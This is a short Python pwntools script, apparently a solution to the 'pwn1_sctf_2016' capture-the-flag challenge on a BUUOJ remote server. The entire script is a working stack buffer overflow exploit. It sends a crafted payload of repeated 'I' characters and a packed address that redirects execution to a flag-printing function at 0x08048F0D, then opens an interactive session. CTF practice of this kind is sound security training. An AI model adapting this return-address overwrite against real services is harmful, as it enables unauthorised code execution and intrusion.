#!/usr/bin/python
#__author__:TaQini

from pwn import *
context.log_level = 'debug'

len = 64
flag = 0x08048F0D

# p = process('./pwn1_sctf_2016')

p = remote('node3.buuoj.cn',28944)

# p.recvuntil('Tell me something about yourself:')

payload = 'I'*21+'A'+p32(flag)

#gdb.attach(p)
p.sendline(payload)

p.interactive()
